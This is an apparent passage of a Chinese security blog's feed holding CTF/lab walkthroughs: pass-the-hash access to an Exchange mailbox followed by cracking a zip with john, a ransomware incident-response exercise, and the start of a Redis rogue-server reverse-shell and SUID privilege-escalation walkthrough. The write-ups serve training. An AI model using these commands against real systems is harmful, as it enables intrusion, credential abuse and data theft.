class="hljs-number">668436</span>  Sun Oct <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">40</span>:<span class="hljs-number">16</span> <span class="hljs-number">2022</span> secret.zip<br># get secret.zip<br></code></pre></td></tr></table></figure><p>flag 就在压缩包中，但需要密码</p><p><img src="https://img.dkdun.cn/v1/2025/12/3727af254e56e0d2.png"></p><p>之前是拿到了 Lumia 的 hash</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">xiaorang.lab\Lumia:<span class="hljs-number">1146</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">862976</span>f8b23c13529c2fb1428e710296:::<br></code></pre></td></tr></table></figure><p><a href="https://github.com/Jumbo-WJB/PTH_Exchange">Jumbo-WJB&#x2F;PTH_Exchange: If you only have hash, you can still operate exchange</a> 获取邮件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python pthexchange.py  --target https://mail.exchange.com --username &quot;yourusername&quot; --password &quot;yourpassword&quot; --action Download<br></code></pre></td></tr></table></figure><p>然后下载邮件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# proxychains -q python pthexchange.py  --target https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>/ --username &quot;Lumia&quot; --password &quot;<span class="hljs-number">862976</span>f8b23c13529c2fb1428e710296:<span class="hljs-number">862976</span>f8b23c13529c2fb1428e710296&quot; --action Download<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">13</span>,<span class="hljs-number">461</span> - DEBUG - [Stage <span class="hljs-number">777</span>] Get Mails Stage <span class="hljs-number">1</span> Finditem ing...<br>/usr/lib/python3/dist-packages/ntlm_auth/rc4.py:<span class="hljs-number">18</span>: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module <span class="hljs-keyword">in</span> <span class="hljs-number">48</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<br>  algo = algorithms.ARC4(key)<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">14</span>,<span class="hljs-number">936</span> - DEBUG - [Stage <span class="hljs-number">777</span>] Get Mails Stage <span class="hljs-number">2</span> GetItem ing...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">18</span>,<span class="hljs-number">530</span> - DEBUG - [Stage <span class="hljs-number">777</span>] Get Mails Stage <span class="hljs-number">3</span> Downloaditem ing...<br>[+] Item [output/item-<span class="hljs-number">0</span>.eml] saved successfully<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">18</span>,<span class="hljs-number">539</span> - DEBUG - [Stage <span class="hljs-number">555</span>] Ready Download Attachmenting...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">18</span>,<span class="hljs-number">794</span> - DEBUG - [Stage <span class="hljs-number">555</span>] Determine <span class="hljs-keyword">if</span> there are attachments <span class="hljs-keyword">in</span> the email...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">18</span>,<span class="hljs-number">794</span> - DEBUG - [Stage <span class="hljs-number">555</span>] This Mail Has Attachment...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">18</span>,<span class="hljs-number">794</span> - DEBUG - [Stage <span class="hljs-number">555</span>] <span class="hljs-built_in">Start</span> Get Attachment Content...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">245</span> - DEBUG - [Stage <span class="hljs-number">555</span>] <span class="hljs-built_in">Start</span> Download Attachment...<br>[+] Item [output/item-<span class="hljs-number">0</span>-secret.zip] saved successfully<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">249</span> - DEBUG - [Stage <span class="hljs-number">777</span>] Get Mails Stage <span class="hljs-number">2</span> GetItem ing...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">448</span> - DEBUG - [Stage <span class="hljs-number">777</span>] Get Mails Stage <span class="hljs-number">3</span> Downloaditem ing...<br>[+] Item [output/item-<span class="hljs-number">1</span>.eml] saved successfully<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">449</span> - DEBUG - [Stage <span class="hljs-number">555</span>] Ready Download Attachmenting...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">635</span> - DEBUG - [Stage <span class="hljs-number">555</span>] Determine <span class="hljs-keyword">if</span> there are attachments <span class="hljs-keyword">in</span> the email...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">635</span> - DEBUG - [Stage <span class="hljs-number">555</span>] This Mail Has Attachment...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">635</span> - DEBUG - [Stage <span class="hljs-number">555</span>] <span class="hljs-built_in">Start</span> Get Attachment Content...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">847</span> - DEBUG - [Stage <span class="hljs-number">555</span>] <span class="hljs-built_in">Start</span> Download Attachment...<br>[+] Item [output/item-<span class="hljs-number">1</span>-phone lists.csv] saved successfully<br></code></pre></td></tr></table></figure><p>拿到一些文件，其中有一封邮件</p><p><img src="https://img.dkdun.cn/v1/2025/12/14369fd9205e3afc.png"></p><p>“Encrypt with your phone number.”，提示手机号解密，提取手机号对 zip 爆破</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# cut -d &#x27;,&#x27; -f3 item-<span class="hljs-number">1</span>-phone\ lists.csv &gt; phone.txt<br><br>┌──(root㉿butt3rf1y)-[/home/butt3rf1y/PTH_Exchange-main/output]<br>└─# zip2john item-<span class="hljs-number">0</span>-secret.zip &gt;hash<br><span class="hljs-built_in">ver</span> <span class="hljs-number">2</span>.<span class="hljs-number">0</span> item-<span class="hljs-number">0</span>-secret.zip/flag.docx PKZIP Encr: cmplen=<span class="hljs-number">668284</span>, decmplen=<span class="hljs-number">671056</span>, crc=AFEF0968 ts=AB91 cs=afef <span class="hljs-built_in">type</span>=<span class="hljs-number">8</span><br><br>┌──(root㉿butt3rf1y)-[/home/butt3rf1y/PTH_Exchange-main/output]<br>└─# john --wordlist=phone.txt hash<br>Using default input encoding: UTF-<span class="hljs-number">8</span><br>Loaded <span class="hljs-number">1</span> password hash (PKZIP [<span class="hljs-number">32</span>/<span class="hljs-number">64</span>])<br>Will run <span class="hljs-number">16</span> OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br><span class="hljs-number">18763918468</span>      (item-<span class="hljs-number">0</span>-secret.zip/flag.docx)<br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE (<span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">45</span>) <span class="hljs-number">16</span>.<span class="hljs-number">66</span>g/s <span class="hljs-number">8350</span>p/s <span class="hljs-number">8350</span>c/s <span class="hljs-number">8350</span>C/s phone..<span class="hljs-number">15989600577</span><br>Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure><p>密码 18763918468</p><p><img src="https://img.dkdun.cn/v1/2025/12/be9c310feb41241d.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag03</span>: flag&#123;cf0c753c-<span class="hljs-number">233</span>f-<span class="hljs-number">4729</span>-<span class="hljs-number">8984</span>-<span class="hljs-number">0746</span>ea5878b7&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>春秋云镜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fastjson Exchange WirteDacl PTH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025年Solar应急响应公益月赛-8月</title>
    <link href="/2025/09/06/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-8%E6%9C%88/"/>
    <url>/2025/09/06/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-8%E6%9C%88/</url>
    
    <content type="html"><![CDATA[<h1 id="【任务1】勒索环境溯源排查"><a href="#【任务1】勒索环境溯源排查" class="headerlink" title="【任务1】勒索环境溯源排查"></a>【任务1】勒索环境溯源排查</h1><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">题目描述</span><br><span class="language-xml">上机排查提交病毒家族的名称，可访问应急响应.com确定家族名称，以flag</span><span class="hljs-template-variable">&#123;xxx&#125;</span><span class="language-xml">提交 首字母大写。</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/590546cbc2de63cb.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Live&#125;</span><br></code></pre></td></tr></table></figure><h1 id="【任务2】勒索环境溯源排查"><a href="#【任务2】勒索环境溯源排查" class="headerlink" title="【任务2】勒索环境溯源排查"></a>【任务2】勒索环境溯源排查</h1><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">题目描述</span><br><span class="language-xml">提交勒索病毒预留的ID，以flag</span><span class="hljs-template-variable">&#123;xxxxxx&#125;</span><span class="language-xml">进行提交</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8bc0c5f778e92453.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">170605242653</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="【任务3】勒索环境溯源排查"><a href="#【任务3】勒索环境溯源排查" class="headerlink" title="【任务3】勒索环境溯源排查"></a>【任务3】勒索环境溯源排查</h1><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">题目描述</span><br><span class="language-xml">解密并提交桌面中flag.txt.LIVE的flag，以flag</span><span class="hljs-template-variable">&#123;xxxx&#125;</span><span class="language-xml">提交</span><br></code></pre></td></tr></table></figure><p>LIVE1.0 恢复工具官网地址：<a href="https://www.solarsecurity.cn/tools?page=1&keyword=LIVE">https://www.solarsecurity.cn/tools?page=1&amp;keyword=LIVE</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">.\LIVE_Decrypto.exe -<span class="hljs-built_in">path</span> &quot;F:\CTF question\Solar8\tools_files_LIVE_Decrypto\flag.txt.LIVE&quot;<br></code></pre></td></tr></table></figure><p>解密 flag.txt.LIVE</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;cf<span class="hljs-number">0971</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>d<span class="hljs-number">17</span>a<span class="hljs-number">03823</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>db<span class="hljs-number">541</span>ea<span class="hljs-number">3</span>b<span class="hljs-number">4</span>ec<span class="hljs-number">2</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="【任务4】勒索环境溯源排查"><a href="#【任务4】勒索环境溯源排查" class="headerlink" title="【任务4】勒索环境溯源排查"></a>【任务4】勒索环境溯源排查</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">题目描述<br>提交Windows Defender删除攻击者<span class="hljs-built_in">C2</span>的时间，以flag&#123;<span class="hljs-number">2025</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>_1:<span class="hljs-number">10</span>&#125;格式提交<br></code></pre></td></tr></table></figure><p>查看 Defender 历史记录</p><p><img src="https://img.dkdun.cn/v1/2025/12/7f2295445f98eb44.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">2025</span>.<span class="hljs-number">8</span>.<span class="hljs-number">25</span>_10:<span class="hljs-number">43</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="【任务5】勒索环境溯源排查"><a href="#【任务5】勒索环境溯源排查" class="headerlink" title="【任务5】勒索环境溯源排查"></a>【任务5】勒索环境溯源排查</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">题目描述<br>提交攻击者关闭Windows Defender的时间，以flag&#123;<span class="hljs-number">2025.1</span>.<span class="hljs-number">1</span>_1:<span class="hljs-number">10</span>&#125;格式提交<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2d2038555102cae7.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">2025</span>.<span class="hljs-number">8</span>.<span class="hljs-number">25</span>_10:<span class="hljs-number">45</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="【任务6】勒索环境溯源排查"><a href="#【任务6】勒索环境溯源排查" class="headerlink" title="【任务6】勒索环境溯源排查"></a>【任务6】勒索环境溯源排查</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">题目描述<br>提交攻击者上传<span class="hljs-built_in">C2</span>的绝对路径，格式以flag&#123;C:\xxx\xxx&#125;提交<br></code></pre></td></tr></table></figure><p>在下载目录中找到可疑程序</p><p><img src="https://img.dkdun.cn/v1/2025/12/5279bbb6f5102f17.png"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">flag&#123;<span class="hljs-name">C</span>:\Users\Administrator\Downloads\Wq12D.exe&#125;<br></code></pre></td></tr></table></figure><h1 id="【任务7】勒索环境溯源排查"><a href="#【任务7】勒索环境溯源排查" class="headerlink" title="【任务7】勒索环境溯源排查"></a>【任务7】勒索环境溯源排查</h1><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gml">题目描述<br>提交攻击者C2的IP外联地址，格式以flag&#123;xx.<span class="hljs-variable language_">x</span>.<span class="hljs-variable language_">x</span>.<span class="hljs-variable language_">x</span>&#125;提交<br></code></pre></td></tr></table></figure><p>把 Wq12D.exe 文件丢进微步沙箱查看</p><p><img src="https://img.dkdun.cn/v1/2025/12/5dec5c5343e683cc.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.186.2</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="【任务8】勒索环境溯源排查"><a href="#【任务8】勒索环境溯源排查" class="headerlink" title="【任务8】勒索环境溯源排查"></a>【任务8】勒索环境溯源排查</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">题目描述<br>提交攻击者加密器绝对路径，格式以flag&#123;C:\xxx\xxx&#125;提交<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/23b87ef582312f2a.png"></p><p>找到加密器</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">flag&#123;<span class="hljs-name">C</span>:\Users\Administrator\Documents\systime.exe&#125;<br></code></pre></td></tr></table></figure><h1 id="【任务9】勒索环境溯源排查"><a href="#【任务9】勒索环境溯源排查" class="headerlink" title="【任务9】勒索环境溯源排查"></a>【任务9】勒索环境溯源排查</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">题目描述<br>溯源黑客攻击路径，利用的哪个漏洞并推测验证，提交起运行文件绝对路径，如：flag&#123;C:\xxx\xxx\xxx&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/e1cd573b8125db23.png"></p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">flag&#123;<span class="hljs-attribute">E</span>:\ruoyi\ruoyi-admin<span class="hljs-variable">.jar</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜-Brute4Road</title>
    <link href="/2025/08/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/"/>
    <url>/2025/08/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/</url>
    
    <content type="html"><![CDATA[<p>Redis 主从复制，CVE-2021-25003，mssql，S4U 伪造</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>扫到了几个东西，ftp 匿名登陆，Redis 未授权访问</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">[+] ftp 39.98.116.201:21:anonymous<br>   [-&gt;]pub<br>[+] Redis 39.98.116.201:6379 unauthorized file:/usr/local/redis/db/dump.rdb<br></code></pre></td></tr></table></figure><h1 id="ftp-匿名登陆"><a href="#ftp-匿名登陆" class="headerlink" title="ftp 匿名登陆"></a>ftp 匿名登陆</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">ftp 39.98.116.201<br>anonymous:anonymous<br></code></pre></td></tr></table></figure><p>有一个 pub 文件目录，但里面什么都没有</p><h1 id="Redis-主从复制-getshell"><a href="#Redis-主从复制-getshell" class="headerlink" title="Redis 主从复制 getshell"></a>Redis 主从复制 getshell</h1><p>开放了 6379 端口，连接</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">redis-cli -h 39.98.116.201<br></code></pre></td></tr></table></figure><p>准备写计划任务反弹 shell，但是没有权限</p><p><img src="https://img.dkdun.cn/v1/2025/12/536b5fb4c5de06e6.png"></p><p>利用主从复制进行 getshell，**<a href="https://github.com/n0b0dyCN/redis-rogue-server">redis-rogue-serve</a>**</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python3 redis-rogue-server.py --rhost 39.98.116.201 --rport 6379 --lhost IP --lport 7788 --exp exp.so<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/809a89981fc93ebb.png"></p><p>反弹 shell，建立连接，在 &#x2F;home&#x2F;redis&#x2F;flag 下找到了 flag01，但是没有权限读取</p><p><img src="https://img.dkdun.cn/v1/2025/12/3f25177f27089327.png"></p><p>查看 SUID</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ef84891118d8012e.png"></p><p>发现可以 base64 提权，不小心退出来了（已吸取教训，好好做权限维持了），上线 vshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">base64</span> <span class="hljs-string">&quot;flag01&quot;</span> | <span class="hljs-built_in">base64</span> --decode<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5148ca201177c749.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag01</span>: flag&#123;<span class="hljs-number">07221</span>d6f-<span class="hljs-number">5129</span>-<span class="hljs-number">47</span>f0-<span class="hljs-number">85</span>ea-<span class="hljs-number">0</span>c691642d351&#125;<br></code></pre></td></tr></table></figure><h1 id="CVE-2021-25003"><a href="#CVE-2021-25003" class="headerlink" title="CVE-2021-25003"></a>CVE-2021-25003</h1><p>上传 fscan 和 frp，ifconfig 知道内网 ip 为 172.22.2.7 </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs sh">[redis@centos-web01 tmp]$ ./FScan_2.0.1_linux_x64 -h 172.22.2.7/24<br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /    │</span><br><span class="hljs-string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="hljs-string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="hljs-string">└──────────────────────────────────────────────┘</span><br><span class="hljs-string">      Fscan Version: 2.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">[1.9s]     已选择服务扫描模式</span><br><span class="hljs-string">[1.9s]     开始信息扫描</span><br><span class="hljs-string">[1.9s]     CIDR范围: 172.22.2.0-172.22.2.255</span><br><span class="hljs-string">[1.9s]     generate_ip_range_full</span><br><span class="hljs-string">[1.9s]     解析CIDR 172.22.2.7/24 -&gt; IP范围 172.22.2.0-172.22.2.255</span><br><span class="hljs-string">[1.9s]     最终有效主机数量: 256</span><br><span class="hljs-string">[1.9s]     开始主机扫描</span><br><span class="hljs-string">[1.9s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle</span><br><span class="hljs-string">[1.9s]     正在尝试无监听ICMP探测...</span><br><span class="hljs-string">[1.9s]     ICMP连接失败: dial ip4:icmp 127.0.0.1: socket: operation not permitted</span><br><span class="hljs-string">[1.9s]     当前用户权限不足,无法发送ICMP包</span><br><span class="hljs-string">[1.9s]     切换为PING方式探测...</span><br><span class="hljs-string">[2.9s] [*] 目标 172.22.2.16     存活 (ICMP)</span><br><span class="hljs-string">[3.0s] [*] 目标 172.22.2.18     存活 (ICMP)</span><br><span class="hljs-string">[5.0s] [*] 目标 172.22.2.3      存活 (ICMP)</span><br><span class="hljs-string">[5.0s] [*] 目标 172.22.2.34     存活 (ICMP)</span><br><span class="hljs-string">[6.0s] [*] 目标 172.22.2.7      存活 (ICMP)</span><br><span class="hljs-string">[7.9s]     存活主机数量: 5</span><br><span class="hljs-string">[7.9s]     有效端口数量: 233</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.16:80</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.16:1433</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.3:389</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.3:445</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.3:139</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.3:135</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.3:88</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.16:445</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.16:139</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.16:135</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.18:80</span><br><span 